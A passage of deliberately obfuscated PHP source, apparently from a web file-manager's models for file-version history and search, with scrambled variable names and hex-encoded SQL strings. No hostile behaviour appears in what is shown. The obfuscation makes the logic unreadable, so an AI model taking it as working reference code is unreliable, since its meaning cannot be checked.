isset($Â‚“©ÖÜ[$¼Í¤âş¸[451]][$¼Í¤âş¸[403]])) { $Â‚“©ÖÜ[$¼Í¤âş¸[451]][$¼Í¤âş¸[403]] = $„¡—ë[$Â‚“©ÖÜ[$¼Í¤âş¸[451]][$¼Í¤âş¸[403]]]; } $Â‚“©ÖÜ[$¼Í¤âş¸[97]] = $„¡—ë[$Â‚“©ÖÜ[$¼Í¤âş¸[403]]]; $Â‚“©ÖÜ[$¼Í¤âş¸[2040]] = $„¡—ë[$Â‚“©ÖÜ[$¼Í¤âş¸[2026]]]; if ($Â‚“©ÖÜ[$¼Í¤âş¸[43]] == $¼Í¤âş¸[1777]) { $Â‚“©ÖÜ[$¼Í¤âş¸[2040]] = $Â‚“©ÖÜ[$¼Í¤âş¸[97]]; $Â‚“©ÖÜ[$¼Í¤âş¸[2026]] = $Â‚“©ÖÜ[$¼Í¤âş¸[2040]][$¼Í¤âş¸[403]]; $Â‚“©ÖÜ[$¼Í¤âş¸[97]] = !1; $Â‚“©ÖÜ[$¼Í¤âş¸[403]] = $¼Í¤âş¸[22]; } $Â‚“©ÖÜ[$¼Í¤âş¸[1971]] = $òÚÌÌÙ[$Â‚“©ÖÜ[$¼Í¤âş¸[1640]]]; } unset($Â‚“©ÖÜ); $³¹™Ê˜Ë[$¼Í¤âş¸[373]] = $ã›ŒÉü; return $³¹™Ê˜Ë; } public function removeBySource($ëµ‘Ï·) { $¦îß¹µ¬ = array($_SERVER[¹àö™Ç¾][418] => $ëµ‘Ï·); $this->where($¦îß¹µ¬)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\162\143\145\x5f\150\x69\x73\x74\x6f\162\171"; public function historyCount($šÆ”ø×“) { $ÚÜÛµÃ =& $_SERVER[¹àö™Ç¾]; if (!$šÆ”ø×“) { return array(); } if (is_string($šÆ”ø×“) || is_int($šÆ”ø×“)) { $šÆ”ø×“ = array($šÆ”ø×“); } $ÍÙûıÕæ = array($ÚÜÛµÃ[403], $ÚÜÛµÃ[1840] => $ÚÜÛµÃ[500]); $„­Â˜ÍÆ = array($ÚÜÛµÃ[403] => array($ÚÜÛµÃ[17], $šÆ”ø×“)); $ÅĞò†„à = $this->field($ÍÙûıÕæ)->where($„­Â˜ÍÆ)->group($ÚÜÛµÃ[403])->select(); return array_to_keyvalue($ÅĞò†„à, $ÚÜÛµÃ[403], $ÚÜÛµÃ[500]); } public function addHistory($ö”Óã˜¤, $è›’´ã = '') { $¯¦„Ö¬° =& $_SERVER[¹àö™Ç¾]; $ä±¢÷¶² = array($¯¦„Ö¬°[418] => $ö”Óã˜¤[$¯¦„Ö¬°[403]], $¯¦„Ö¬°[1631] => isset($ö”Óã˜¤[$¯¦„Ö¬°[454]]) ? $ö”Óã˜¤[$¯¦„Ö¬°[454]] : $ö”Óã˜¤[$¯¦„Ö¬°[452]], $¯¦„Ö¬°[468] => $ö”Óã˜¤[$¯¦„Ö¬°[467]], $¯¦„Ö¬°[579] => $ö”Óã˜¤[$¯¦„Ö¬°[90]], $¯¦„Ö¬°[2041] => $è›’´ã); $È‚Î«Ô¹ = $GLOBALS[$¯¦„Ö¬°[16]][$¯¦„Ö¬°[100]][$¯¦„Ö¬°[1192]]; if ($È‚Î«Ô¹ > 1) { $this->historyAutoClear($ä±¢÷¶²[$¯¦„Ö¬°[403]]); $this->add($ä±¢÷¶²); } Hook::trigger($¯¦„Ö¬°[2042], $ä±¢÷¶²); Model($¯¦„Ö¬°[2043])->eventFileEdit($ö”Óã˜¤[$¯¦„Ö¬°[403]]); } private function historyAutoClear($¶ı…Ó§ç) { $ëƒ´¾æ =& $_SERVER[¹àö™Ç¾]; $µã™“éÏ = Model($ëƒ´¾æ[762])->get($ëƒ´¾æ[1214]); $…áñ‰ı¬ = $GLOBALS[$ëƒ´¾æ[16]][$ëƒ´¾æ[100]][$ëƒ´¾æ[1192]]; $³ Ï³é¦ = $µã™“éÏ == $ëƒ´¾æ[1215] ? 5 : $…áñ‰ı¬; if ($…áñ‰ı¬ <= 1) { $³ Ï³é¦ = 1; } if ($³ Ï³é¦ >= 500) { return; } $˜òÇèªó = array($ëƒ´¾æ[418] => $¶ı…Ó§ç); $”Á Å¨« = $this->field($ëƒ´¾æ[2044])->where($˜òÇèªó)->order($ëƒ´¾æ[2038])->select(); if (!$”Á Å¨« || $³ Ï³é¦ >= count($”Á Å¨«)) { return; } $‹æó£±» = array_to_keyvalue($”Á Å¨«, $ëƒ´¾æ[22], $ëƒ´¾æ[401]); $‹æó£±» = array_slice($‹æó£±», $³ Ï³é¦); $ıÂÅÑ²› = array_to_keyvalue($”Á Å¨«, $ëƒ´¾æ[22], $ëƒ´¾æ[467]); $ıÂÅÑ²› = array_slice($ıÂÅÑ²›, $³ Ï³é¦); if (!$‹æó£±» || !$ıÂÅÑ²›) { return; } $˜òÇèªó = array($ëƒ´¾æ[420] => array($ëƒ´¾æ[17], $‹æó£±»)); $this->where($˜òÇèªó)->delete(); Model($ëƒ´¾æ[470])->remove($ıÂÅÑ²›); } public function listData($…÷ÔÀ¥¡) { $«•˜Ìñ« =& $_SERVER[¹àö™Ç¾]; $ˆ÷¨½¾ = array($«•˜Ìñ«[418] => $…÷ÔÀ¥¡); $€–»óë× = $«•˜Ìñ«[2045]; $¿¼ºşÅ… = $this->field($€–»óë×)->where($ˆ÷¨½¾)->order($«•˜Ìñ«[2038])->selectPage(); $this->_listAppendUser($¿¼ºşÅ…[$«•˜Ìñ«[373]]); $Ô£¡ŒÚˆ = Model($«•˜Ìñ«[762])->get($«•˜Ìñ«[1214]); $ÏóœÄÆÖ = 5; if ($Ô£¡ŒÚˆ == $«•˜Ìñ«[1215]) { $¿¼ºşÅ…[$«•˜Ìñ«[373]] = array_slice($¿¼ºşÅ…[$«•˜Ìñ«[373]], 0, $ÏóœÄÆÖ); $¿¼ºşÅ…[$«•˜Ìñ«[370]] = array($«•˜Ìñ«[2046] => 1, $«•˜Ìñ«[2047] => 20, $«•˜Ìñ«[2048] => 1, $«•˜Ìñ«[2049] => count($¿¼ºşÅ…[$«•˜Ìñ«[373]])); } return $¿¼ºşÅ…; } protected function _listAppendUser(&$òœ×É¤á) { $½½Ç¡üÈ =& $_SERVER[¹àö™Ç¾]; $ğâéÑ§ƒ = array_to_keyvalue($òœ×É¤á, $½½Ç¡üÈ[22], $½½Ç¡üÈ[1640]); $•úÏìˆ… = Model($½½Ç¡üÈ[538])->userListInfo($ğâéÑ§ƒ); foreach ($òœ×É¤á as &$Ğ¡İÓÌÜ) { $å—İëÅé = $Ğ¡İÓÌÜ[$½½Ç¡üÈ[1640]]; $Ğ¡İÓÌÜ[$½½Ç¡üÈ[452]] = $•úÏìˆ…[$å—İëÅé] ? $•úÏìˆ…[$å—İëÅé] : !1; } unset($Ğ¡İÓÌÜ); } public function fileInfo($‡†ùíŞ¸) { $ú×¥ß¹ =& $_SERVER[¹àö™Ç¾]; $¼‰±®ù = $this->tablePrefix; $ÆÅÓ¶ïç = "{$¼‰±®ù}\151\x6f\x5f\146\x69\x6c\x65\40\146\x69\x6c\145\163\x20\157\156\40\146\151\x6c\145\163\x2e\146\x69\154\145\111\104\40\75\40\x68\x69\163\x74\157\x72\x79\x2e\146\x69\154\145\111\104"; return $this->alias($ú×¥ß¹[2050])->where(array($ú×¥ß¹[420] => $‡†ùíŞ¸))->join($ÆÅÓ¶ïç, $ú×¥ß¹[2051])->find(); } public function removeItem($ñ˜©¨µ§) { $İŠó’•ô =& $_SERVER[¹àö™Ç¾]; $á’˜ÈŠ = array($İŠó’•ô[420] => $ñ˜©¨µ§); $ÂÂó°­³ = $this->where($á’˜ÈŠ)->find(); if ($ÂÂó°­³) { $Ôì„¿ü = $this->where($á’˜ÈŠ)->delete(); Model($İŠó’•ô[470])->remove($ÂÂó°­³[$İŠó’•ô[467]]); return $Ôì„¿ü; } return !1; } public function removeBySource($Øüøâ) { $ü©ìÕ‡Ú =& $_SERVER[¹àö™Ç¾]; if (!$Øüøâ) { return !1; } if (!is_array($Øüøâ)) { $Øüøâ = array($Øüøâ); } $ğËé¶¤Í = array($ü©ìÕ‡Ú[418] => array($ü©ìÕ‡Ú[17], $Øüøâ)); $ˆÂ²ÎÎÈ = $this->field($ü©ìÕ‡Ú[468])->where($ğËé¶¤Í)->select(); if ($ˆÂ²ÎÎÈ) { $this->where($ğËé¶¤Í)->delete(); $çÁğÉ­„ = array_to_keyvalue($ˆÂ²ÎÎÈ, $ü©ìÕ‡Ú[22], $ü©ìÕ‡Ú[467]); Model($ü©ìÕ‡Ú[470])->remove($çÁğÉ­„); } return !0; } public function setDetail($éÆœºÆ¶, $”§çæà—) { $Ì±„æà® =& $_SERVER[¹àö™Ç¾]; return $this->where(array($Ì±„æà®[420] => $éÆœºÆ¶))->save(array($Ì±„æà®[2041] => $”§çæà—)); } public function rollbackToItem($Û”–ÁÔ , $ıÉ¶²á¹) { $ÚÔ‚£±ë =& $_SERVER[¹àö™Ç¾]; $ìì„µ— = Model($ÚÔ‚£±ë[817])->sourceInfo($Û”–ÁÔ ); $this->addHistory($ìì„µ—, LNG($ÚÔ‚£±ë[2052])); $“¡µ§¸¾ = $this->find($ıÉ¶²á¹); $‡İœ×ìõ = array($ÚÔ‚£±ë[467] => $“¡µ§¸¾[$ÚÔ‚£±ë[467]], $ÚÔ‚£±ë[90] => $“¡µ§¸¾[$ÚÔ‚£±ë[90]], $ÚÔ‚£±ë[96] => time(), $ÚÔ‚£±ë[454] => USER_ID); Model($ÚÔ‚£±ë[817])->where(array($ÚÔ‚£±ë[403] => $Û”–ÁÔ ))->save($‡İœ×ìõ); return $this->where(array($ÚÔ‚£±ë[420] => $ıÉ¶²á¹))->delete(); } public function clearSame($²ë×Ş”) { $ßşîÍŒ =& $_SERVER[¹àö™Ç¾]; $ø¯×´õ = $this->listData($²ë×Ş”); $©ªÑ®¶¯ = array_to_keyvalue_group($ø¯×´õ, $ßşîÍŒ[467]); $Ë¿²£† = array(); $šÍİ·æ = array(); foreach ($©ªÑ®¶¯ as $óğ²Æöä) { if (!$óğ²Æöä || count($óğ²Æöä) <= 1) { continue; } foreach ($óğ²Æöä as $‹¤°Ä¸Ş) { $Ë¿²£†[] = $‹¤°Ä¸Ş[$ßşîÍŒ[467]]; $šÍİ·æ[] = $‹¤°Ä¸Ş[$ßşîÍŒ[401]]; } } if (!$šÍİ·æ) { return; } $this->where(array($ßşîÍŒ[401] => array($ßşîÍŒ[17], $šÍİ·æ)))->delete(); Model($ßşîÍŒ[470])->remove($Ë¿²£†); } public function userSpace() { $ºŞØƒû™ =& $_SERVER[¹àö™Ç¾]; $Ã±íñˆø = $this->tablePrefix; $‘±ïÊ±ˆ = array($ºŞØƒû™[1631] => USER_ID); $ü¨Ë†ËŠ = "{$Ã±íñˆø}\x69\x6f\x5f\x66\x69\x6c\145\x20\x66\x69\x6c\x65\x73\x20\x6f\x6e\x20\146\151\154\x65\x73\x2e\x66\x69\x6c\x65\111\x44\40\75\40\150\151\163\x74\157\x72\171\x2e\x66\x69\x6c\x65\x49\x44"; return $this->alias($ºŞØƒû™[2050])->where($‘±ïÊ±ˆ)->join($ü¨Ë†ËŠ, $ºŞØƒû™[2051])->sum($ºŞØƒû™[90]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ñµ¦Ü˜Å) { $Àï¤™¯ù =& $_SERVER[¹àö™Ç¾]; $‹—ÂÒ¬Ÿ = KodIO::fileTypeList(); $ñé¡ô¾Ò = $‹—ÂÒ¬Ÿ[$ñµ¦Ü˜Å]; if (!$ñé¡ô¾Ò) { return array(); } $ÖÉ“¡‘ê = $ñé¡ô¾Ò[$Àï¤™¯ù[177]]; $ ˆ¥Ÿ¸¸ = $Àï¤™¯ù[17]; if (!$ñé¡ô¾Ò[$Àï¤™¯ù[177]]) { $ÑõÁ­¾û = array_to_keyvalue($‹—ÂÒ¬Ÿ, $Àï¤™¯ù[22], $Àï¤™¯ù[177]); $ÖÉ“¡‘ê = implode($Àï¤™¯ù[60], $ÑõÁ­¾û); $ ˆ¥Ÿ¸¸ = $Àï¤™¯ù[2053]; } $ä‘Áçˆş = explode($Àï¤™¯ù[60], trim($ÖÉ“¡‘ê, $Àï¤™¯ù[60])); return array($ ˆ¥Ÿ¸¸, $ä‘Áçˆş); } public function listPathType($‚ïÁê¤§) { $¶¸ÇèÕ =& $_SERVER[¹àö™Ç¾]; $Ü†½Û¬Ş = $this->fileTypeWhere($‚ïÁê¤§); if (!$Ü†½Û¬Ş) { return array(); } $º­ä©¢õ = array($¶¸ÇèÕ[580] => SourceModel::TYPE_USER, $¶¸ÇèÕ[581] => USER_ID, $¶¸ÇèÕ[577] => 0, $¶¸ÇèÕ[578] => $Ü†½Û¬Ş); return $this->listSource($º­ä©¢õ); } public function listSearch($â«½®‚˜, $›Æ±·Ì¿ = 300) { $ØâŒü˜¹ =& $_SERVER[¹àö™Ç¾]; if (isset($â«½®‚˜[$ØâŒü˜¹[1899]]) && $â«½®‚˜[$ØâŒü˜¹[1899]]) { $â«½®‚˜[$ØâŒü˜¹[1899]] = str_replace($ØâŒü˜¹[388], $ØâŒü˜¹[2054], trim($â«½®‚˜[$ØâŒü˜¹[1899]])); } $ğ½Ü—ï‰ = $this->_parseSearchWhere($â«½®‚˜); $ç íº‡Ë = $ğ½Ü—ï‰; if (!isset($ğ½Ü—ï‰[$ØâŒü˜¹[431]])) { $ğ½Ü—ï‰[$ØâŒü˜¹[431]] = 0; } $Œ…ÍØñö = $ØâŒü˜¹[2055]; $ÈÄ¼óé = $Œ…ÍØñö; $this->_listSearchBindPinyin($â«½®‚˜, $ğ½Ü—ï‰, $Œ…ÍØñö); $this->alias($ØâŒü˜¹[444])->_makeOrder(); $ğ½Ü—ï‰ = $this->parseWhereLike($ğ½Ü—ï‰); $çï˜¶ = $this->distinct(!0)->field($Œ…ÍØñö)->where($ğ½Ü—ï‰)->selectPage($›Æ±·Ì¿); $this->_listSearchFileContent($çï˜¶, $â«½®‚˜, $ÈÄ¼óé, $ç íº‡Ë); $this->_listSearchDesc($çï˜¶, $â«½®‚˜, $ÈÄ¼óé); $this->_listSearchTag($çï˜¶, $â«½®‚˜, $ÈÄ¼óé); $this->_listSearchGroupTag($çï˜¶, $â«½®‚˜, $ÈÄ¼óé); $this->_listDataApply($çï˜¶[$ØâŒü˜¹[373]]); $this->_listMake($çï˜¶); return $çï˜¶; } private function _listSearchFileContent(&$ò¨Œ Óº, $Üèíáî, $û¶Ï³©ø, $úâ­ÆÄ) { $Ÿ–÷íÛ =& $_SERVER[¹àö™Ç¾]; if (!$Üèíáî[$Ÿ–÷íÛ[1899]] || $ò¨Œ Óº[$Ÿ–÷íÛ[370]][$Ÿ–÷íÛ[357]] > 1) { return; } if (!isset($úâ­ÆÄ[$Ÿ–÷íÛ[42]]) || !is_array($Üèíáî[$Ÿ–÷íÛ[467]])) { return; } $úâ­ÆÄ[$Ÿ–÷íÛ[467]] = array($Ÿ–÷íÛ[17], $Üèíáî[$Ÿ–÷íÛ[467]]); unset($úâ­ÆÄ[$Ÿ–÷íÛ[42]]); unset($Üèíáî[$Ÿ–÷íÛ[467]]); $õÈ¦èâ = $this->field($û¶Ï³©ø)->where($úâ­ÆÄ)->limit($Ÿ–÷íÛ[2056])->select(); if (!$õÈ¦èâ || count($õÈ¦èâ) == 0) { return; } $ò¨Œ Óº[$Ÿ–÷íÛ[373]] = array_merge($õÈ¦èâ, $ò¨Œ Óº[$Ÿ–÷íÛ[373]]); $ò¨Œ Óº[$Ÿ–÷íÛ[370]][$Ÿ–÷íÛ[371]] += count($õÈ¦èâ); } private function _listSearchTag(&$á×ÅÓ±, $¿ó€¨¡ø, $ÅÕÇŞ¦) { $”¾ÕÛ’ƒ =& $_SERVER[¹àö™Ç¾]; if (!$¿ó€¨¡ø[$”¾ÕÛ’ƒ[1899]] || $á×ÅÓ±[$”¾ÕÛ’ƒ[370]][$”¾ÕÛ’ƒ[357]] > 1) { return; } $ôäÕøÁñ = Model($”¾ÕÛ’ƒ[2057])->listData(); $‚œİó“ì = array(); $ƒËËªŞ = $¿ó€¨¡ø[$”¾ÕÛ’ƒ[1899]]; foreach ($ôäÕøÁñ as $Õ˜£é¬ı) { $ ÈñŞÛô = $Õ˜£é¬ı[$”¾ÕÛ’ƒ[42]]; $…ÍâÄî… = str_replace($”¾ÕÛ’ƒ[63], $”¾ÕÛ’ƒ[22], Pinyin::get($ ÈñŞÛô)); if (stripos($ ÈñŞÛô, $ƒËËªŞ) !== !1 || stripos($…ÍâÄî…, $ƒËËªŞ) !== !1) { $‚œİó“ì[] = $Õ˜£é¬ı[$”¾ÕÛ’ƒ[401]]; } } if (!$‚œİó“ì) { return; } $«Ù–âŸâ = array($”¾ÕÛ’ƒ[427] => array($”¾ÕÛ’ƒ[17], $‚œİó“ì), $”¾ÕÛ’ƒ[1640] => USER_ID); $èÆ¤è¥‹ = Model($”¾ÕÛ’ƒ[428])->field($”¾ÕÛ’ƒ[88])->where($«Ù–âŸâ)->select(); $èÆ¤è¥‹ = array_to_keyvalue($èÆ¤è¥‹, $”¾ÕÛ’ƒ[22], $”¾ÕÛ’ƒ[88]); $ú§‹•Á = array_unique($èÆ¤è¥‹); $this->_listSearchMerge($á×ÅÓ±, $¿ó€¨¡ø, $ÅÕÇŞ¦, $ú§‹•Á); } private function _listSearchDesc(&$‚™¹Œ, $„ø«Şš¨, $åÛ–ĞÃ) { $”´íó•Ş =& $_SERVER[¹àö™Ç¾]; if (!$„ø«Şš¨[$”´íó•Ş[1899]] || $‚™¹Œ[$”´íó•Ş[370]][$”´íó•Ş[357]] > 1) { return; } $é‰Éš»È = $this->listSearchChildren($„ø«Şš¨[$”´íó•Ş[498]]); $é‰Éš»È = array_unique($é‰Éš»È); if (!$é‰Éš»È) { return; } $­È§ı = array($”´íó•Ş[403] => array($”´íó•Ş[17], $é‰Éš»È), $”´íó•Ş[105] => $”´íó•Ş[451], $”´íó•Ş[378] => array($”´íó•Ş[387], $”´íó•Ş[1901] . $„ø«Şš¨[$”´íó•Ş[1899]] . $”´íó•Ş[1901])); $·Æó’ä = Model($”´íó•Ş[563])->field($”´íó•Ş[403])->where($­È§ı)->select(); $åÈ¢ı­ó = array_to_keyvalue($·Æó’ä, $”´íó•Ş[22], $”´íó•Ş[403]); $this->_listSearchMerge($‚™¹Œ, $„ø«Şš¨, $åÛ–ĞÃ, $åÈ¢ı­ó); } private function _listSearchGroupTag(&$¬™–ˆ‹“, $ÅØÇÚÆ½, $çÌÇ¦•˜) { $¿Âº¾® =& $_SERVER[¹àö™Ç¾]; if (!$ÅØÇÚÆ½[$¿Âº¾®[1899]] || $¬™–ˆ‹“[$¿Âº¾®[370]][$¿Âº¾®[357]] > 1 || !$ÅØÇÚÆ½[$¿Âº¾®[498]]) { return; } $İ±ºû„» = $this->sourceInfo($ÅØÇÚÆ½[$¿Âº¾®[498]]); if (!$İ±ºû„» || $İ±ºû„»[$¿Âº¾®[412]] != SourceModel::TYPE_GROUP) { return; } $üËñ¦‹û = $İ±ºû„»[$¿Âº¾®[504]]; $ ±ªòÉ­ = Model($¿Âº¾®[2058])->get($üËñ¦‹û); $Ğî¸±ô = array(); $Í¿ÂØ¤Î = $ÅØÇÚÆ½[$¿Âº¾®[1899]]; foreach ($ ±ªòÉ­[$¿Âº¾®[373]] as $ù¤Ù›‚Ğ) { $¿“¬Èİ = $ù¤Ù›‚Ğ[$¿Âº¾®[42]]; $±î—¹ş… = str_replace($¿Âº¾®[63], $¿Âº¾®[22], Pinyin::get($¿“¬Èİ)); if (stripos($¿“¬Èİ, $Í¿ÂØ¤Î) !== !1 || stripos($±î—¹ş…, $Í¿ÂØ¤Î) !== !1) { $Ğî¸±ô[] = $ù¤Ù›‚Ğ[$¿Âº¾®[401]]; } } if (!$Ğî¸±ô) { return; } $½øëÃş­ = array($¿Âº¾®[427] => array($¿Âº¾®[17], $Ğî¸±ô), $¿Âº¾®[1640] => 0, $¿Âº¾®[43] => $¿Âº¾®[1921] . $üËñ¦‹û); $©ú´ë‰° = Model($¿Âº¾®[428])->field($¿Âº¾®[88])->where($½øëÃş­)->select(); $©ú´ë‰° = array_to_keyvalue($©ú´ë‰°, $¿Âº¾®[22], $¿Âº¾®[88]); $à‚“· = array_unique($©ú´ë‰°); $this->_listSearchMerge($¬™–ˆ‹“, $ÅØÇÚÆ½, $çÌÇ¦•˜, $à‚“·); } private function _listSearchMerge(&$¤âØó”Ç, $ú†ê«›ˆ, $Ïíº†®¹, $Üô¯”Ï) { $Ò›é”ëº =& $_SERVER[¹àö™Ç¾]; if (!$Üô¯”Ï) { return; } $°¢š•£Û = array_to_keyvalue($¤âØó”Ç[$Ò›é”ëº[373]], $Ò›é”ëº[22], $Ò›é”ëº[403]); $ˆÕüÔ¢• = array_diff($Üô¯”Ï, $°¢š•£Û); if (!$ˆÕüÔ¢•) { return; } $Î¤Ú¥Æ = array($Ò›é”ëº[403] => array($Ò›é”ëº[17], $ˆÕüÔ¢•)); $ßíÆ†‚ş = $this->field($Ïíº†®¹)->where($Î¤Ú¥Æ)->select(); if (!$ßíÆ†‚ş) { return; } $­óºÛ³ = array(); foreach ($ßíÆ†‚ş as $øÈ­êÎ®) { if ($this->_listSearchFilter($øÈ­êÎ®, $ú†ê«›ˆ)) { $­óºÛ³[] = $øÈ­êÎ®; } } $¤âØó”Ç[$Ò›é”ëº[373]] = array_merge($­óºÛ³, $¤âØó”Ç[$Ò›é”ëº[373]]); $¤âØó”Ç[$Ò›é”ëº[370]][$Ò›é”ëº[371]] += count($­óºÛ³); } private function _listSearchFilter($›‹Ÿ—‡Å, $ó¶‘´„¼) { $°ç¦º¼µ =& $_SERVER[¹àö™Ç¾]; $•ñ‹ıÕ˜ = $›‹Ÿ—‡Å[$°ç¦º¼µ[411]] == $°ç¦º¼µ[99]; if (!strstr($›‹Ÿ—‡Å[$°ç¦º¼µ[521]], $°ç¦º¼µ[60] . $ó¶‘´„¼[$°ç¦º¼µ[498]] . $°ç¦º¼µ[60])) { return !1; } if (isset($ó¶‘´„¼[$°ç¦º¼µ[413]]) && $ó¶‘´„¼[$°ç¦º¼µ[413]] != $°ç¦º¼µ[1862]) { if ($ó¶‘´„¼[$°ç¦º¼µ[413]] == $°ç¦º¼µ[89] && !$•ñ‹ıÕ˜) { return !1; } if ($ó¶‘´„¼[$°ç¦º¼µ[413]] != $°ç¦º¼µ[89] && $•ñ‹ıÕ˜) { return !1; } if (!strstr($›‹Ÿ—‡Å[$°ç¦º¼µ[177]], $°ç¦º¼µ[60] . $ó¶‘´„¼[$°ç¦º¼µ[413]] . $°ç¦º¼µ[60])) { return !1; } } if (isset($ó¶‘´„¼[$°ç¦º¼µ[2059]]) && $ó¶‘´„¼[$°ç¦º¼µ[2059]] < $›‹Ÿ—‡Å[$°ç¦º¼µ[90]]) { return !1; } if (isset($ó¶‘´„¼[$°ç¦º¼µ[2060]]) && $ó¶‘´„¼[$°ç¦º¼µ[2060]] > $›‹Ÿ—‡Å[$°ç¦º¼µ[90]]) { return !1; } if (isset($ó¶‘´„¼[$°ç¦º¼µ[594]]) && $ó¶‘´„¼[$°ç¦º¼µ[594]] != $›‹Ÿ—‡Å[$°ç¦º¼µ[454]]) { return !1; } return !0; } public function listSearchChildren($£•ïÛ€Ô, $€ì”¿˜§ = 5000) { $°½ÒŸÕ =& $_SERVER[¹àö™Ç¾]; $ª•òËÁ = array(); $‡—ã¾Ì¦ = $this->sourceInfo($£•ïÛ€Ô); $—œã°Ä = array($°½ÒŸÕ[521] => array($°½ÒŸÕ[387], $‡—ã¾Ì¦[$°½ÒŸÕ[521]] . $‡—ã¾Ì¦[$°½ÒŸÕ[403]] . $°½ÒŸÕ[545])); $ˆ¥ïÀÒà = $this->field($°½ÒŸÕ[90])->where($—œã°Ä)->limit($€ì”¿˜§ + 1)->select(); $©¹®Í˜Ò = is_array($ˆ¥ïÀÒà) ? count($ˆ¥ïÀÒà) : 0; if ($©¹®Í˜Ò > $€ì”¿˜§) { return $this->_listSearchChildrenNear($£•ïÛ€Ô, $€ì”¿˜§); } $å½—Ë» = $this->field($°½ÒŸÕ[403])->where($—œã°Ä)->select(); $ª•òËÁ = array_to_keyvalue($å½—Ë», $°½ÒŸÕ[22], $°½ÒŸÕ[403]); return $ª•òËÁ; } private function _listSearchChildrenNear($Ÿ×ĞÈ´¢, $™‘ß•‹Š) { $£ÒÇ™È’ =& $_SERVER[¹àö™Ç¾]; $õ™í§Åã = array(); $šøÃÒĞ = array($£ÒÇ™È’[498] => $Ÿ×ĞÈ´¢); $ÆÓ¢”¸š = $this->field($£ÒÇ™È’[2061])->where($šøÃÒĞ)->select(); $Ï’òšåª = array_to_keyvalue(array_filter_by_field($ÆÓ¢”¸š, $£ÒÇ™È’[411], $£ÒÇ™È’[99]), $£ÒÇ™È’[22], $£ÒÇ™È’[403]); $õ™í§Åã = array_merge($õ™í§Åã, array_to_keyvalue($ÆÓ¢”¸š, $£ÒÇ™È’[22], $£ÒÇ™È’[403])); if (!$Ï’òšåª) { return $õ™í§Åã; } $šøÃÒĞ = array($£ÒÇ™È’[498] => array($£ÒÇ™È’[17], $Ï’òšåª)); $ÆÓ¢”¸š = $this->field($£ÒÇ™È’[2061])->where($šøÃÒĞ)->limit($™‘ß•‹Š)->select(); $õ™í§Åã = array_merge($õ™í§Åã, array_to_keyvalue($ÆÓ¢”¸š, $£ÒÇ™È’[22], $£ÒÇ™È’[403])); $õ™í§Åã = array_slice($õ™í§Åã, 0, $™‘ß•‹Š); return $õ™í§Åã; } private function _listSearchBindPinyin($û¢×Š‘¥, &$šÇ¶–±, &$ÃùÃ¬Ê) { $“É°È‡Ã =& $_SERVER[¹àö™Ç¾]; if (!isset($û¢×Š‘¥[$“É°È‡Ã[1899]]) || !$û¢×Š‘¥[$“É°È‡Ã[1899]]) { return; } if (!Input::check($û¢×Š‘¥[$“É°È‡Ã[1899]], $“É°È‡Ã[322]) || strlen($û¢×Š‘¥[$“É°È‡Ã[1899]]) < 2) { return; } $„Ô‚¼Œ× = "\x4c\105\x46\124\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\x6f\137\163\x6f\x75\x72\x63\x65\137\x6d\145\164\x61\x20\x6d\x65\x74\x61\x20\157\x6e\x20\x73\157\x75\162\x63\x65\56\x73\x6f\x75\162\x63\x65\x49\x44\x20\75\40\155\145\164\141\56\163\157\x75\162\143\x65\111\x44"; $“¤Û‚‘ = array(); $ÃùÃ¬Ê = str_replace(array($“É°È‡Ã[11], $“É°È‡Ã[63], $“É°È‡Ã[2062]), $“É°È‡Ã[22], $ÃùÃ¬Ê); $ÃùÃ¬Ê = $“É°È‡Ã[436] . str_replace($“É°È‡Ã[60], $“É°È‡Ã[437], $ÃùÃ¬Ê); $âµ«˜Ç = $šÇ¶–±[$“É°È‡Ã[42]]; unset($šÇ¶–±[$“É°È‡Ã[42]]); foreach ($šÇ¶–± as $üßÅâ¿ => $œ‚è—ö­) { $“¤Û‚‘[$“É°È‡Ã[436] . $üßÅâ¿] = $œ‚è—ö­; } foreach ($âµ«˜Ç as $·½Û¼«á) { $“¤Û‚‘[] = array($“É°È‡Ã[441] => $·½Û¼«á, $“É°È‡Ã[985] => $“É°È‡Ã[1903], array($“É°È‡Ã[2063] => $·½Û¼«á, $“É°È‡Ã[2064] => array($“É°È‡Ã[17], array($“É°È‡Ã[464], $“É°È‡Ã[463])))); } $this->join($„Ô‚¼Œ×); $šÇ¶–± = $“¤Û‚‘; } private function _parseSearchWhere($¿€Òµ—à) { $İ—×½ì¶ =& $_SERVER[¹àö™Ç¾]; $Ôä»¨Ç¨ = array(); if (isset($¿€Òµ—à[$İ—×½ì¶[753]]) && $¿€Òµ—à[$İ—×½ì¶[753]]) { $Ôä»¨Ç¨[$İ—×½ì¶[96]] = array($İ—×½ì¶[2065], $¿€Òµ—à[$İ—×½ì¶[753]]); } if (isset($¿€Òµ—à[$İ—×½ì¶[496]]) && $¿€Òµ—à[$İ—×½ì¶[496]]) { $ã¨ù˜ö‚ = array($İ—×½ì¶[2066], $¿€Òµ—à[$İ—×½ì¶[496]]); if ($Ôä»¨Ç¨[$İ—×½ì¶[96]]) { $Ôä»¨Ç¨[$İ—×½ì¶[96]] = array($Ôä»¨Ç¨[$İ—×½ì¶[96]], $ã¨ù˜ö‚, $İ—×½ì¶[2067]); } else { $Ôä»¨Ç¨[$İ—×½ì¶[96]] = $ã¨ù˜ö‚; } } if (isset($¿€Òµ—à[$İ—×½ì¶[2059]]) && $¿€Òµ—à[$İ—×½ì¶[2059]] > 0) { $Ôä»¨Ç¨[$İ—×½ì¶[90]] = array($İ—×½ì¶[2065], $¿€Òµ—à[$İ—×½ì¶[2059]]); } if (isset($¿€Òµ—à[$İ—×½ì¶[2060]]) && $¿€Òµ—à[$İ—×½ì¶[2060]]) { $ã¨ù˜ö‚ = array($İ—×½ì¶[2066], $¿€Òµ—à[$İ—×½ì¶[2060]]); if ($Ôä»¨Ç¨[$İ—×½ì¶[90]]) { $Ôä»¨Ç¨[$İ—×½ì¶[90]] = array($Ôä»¨Ç¨[$İ—×½ì¶[90]], $ã¨ù˜ö‚, $İ—×½ì¶[2067]); } else { $Ôä»¨Ç¨[$İ—×½ì¶[90]] = $ã¨ù˜ö‚; } } if (isset($¿€Òµ—à[$İ—×½ì¶[594]]) && $¿€Òµ—à[$İ—×½ì¶[594]]) { $Ôä»¨Ç¨[] = array($İ—×½ì¶[454] => $¿€Òµ—à[$İ—×½ì¶[594]], $İ—×½ì¶[452] => $¿€Òµ—à[$İ—×½ì¶[594]], $İ—×½ì¶[985] => $İ—×½ì¶[1903]); } if 